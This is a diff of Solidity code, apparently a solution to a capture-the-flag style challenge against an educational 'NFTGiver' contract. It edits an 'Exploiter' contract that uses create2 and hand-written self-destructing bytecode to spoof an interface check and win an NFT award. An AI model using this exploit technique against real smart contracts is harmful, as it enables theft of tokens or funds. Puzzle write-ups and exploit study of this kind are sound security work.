@@ -16,7 +16,7 @@ contract Award is ERC721 {
 // protocol. Don't copy this code for production applications.
 
 contract NFTGiver {
-    uint256 public constant GAS_LIMIT = 41;
+    uint256 public constant GAS_LIMIT = 39;
     struct Game {
         bool success1;
         bool success2;
@@ -121,8 +121,11 @@ contract DeployInterface{
     function deploy(bytes4 interfaceid) external returns (address){
         // address t = address(new InterfaceContract(interfaceid));
         address t ;
-        // 60308060093d393df37f 4e2312e000000000000000000000000000000000000000000000000000000000 60043580602957ff5b143d52593df3%
-        bytes memory bytecode = abi.encodePacked(hex"60308060093d393df37f",interfaceid,hex"0000000000000000000000000000000000000000000000000000000060043580602957ff5b143d52593df3");
+        // 60308060093d393df37f 4e2312e0 00000000000000000000000000000000000000000000000000000000 60043580602957ff5b143d52593df3%
+        // bytes memory bytecode = abi.encodePacked(hex"60308060093d393df37f",interfaceid,hex"0000000000000000000000000000000000000000000000000000000060043580602957ff5b143d52593df3");
+        // 60318060093d393df37f 4e2312e0 000000000000000000000000000000000000000000000000000000006004353461002f57143d52593df35bff%
+        bytes memory bytecode = abi.encodePacked(hex"60318060093d393df37f",interfaceid,hex"000000000000000000000000000000000000000000000000000000006004353461002f57143d52593df35bff");
+
         // console.logBytes(bytecode);
         assembly {
             t := create2(
@@ -167,7 +170,7 @@ contract DeployInterface{
 }
 
 interface InterfaceContract{
-    function destroy() external;
+    function destroy() external payable;
 }
 
 
@@ -177,7 +180,7 @@ contract Exploiter{
         // console.log(" --- Exploiter::()# created");
     }
 
-    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award) external {
+    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award) external payable {
         // console.log("#############################################################");
         DeployInterface deployer = new DeployInterface{salt:0x0}();
         address target = deployer.deploy(ifceId);
@@ -185,7 +188,7 @@ contract Exploiter{
         // console.log("target ",target);
         // console.logBytes4(InterfaceContract(target).interfaceid());
         address(victim).call(abi.encodeWithSelector(funcSig,target));
-        InterfaceContract(target).destroy();
+        InterfaceContract(target).destroy{value:1000 gwei}();
         deployer.destroy();
     }
 
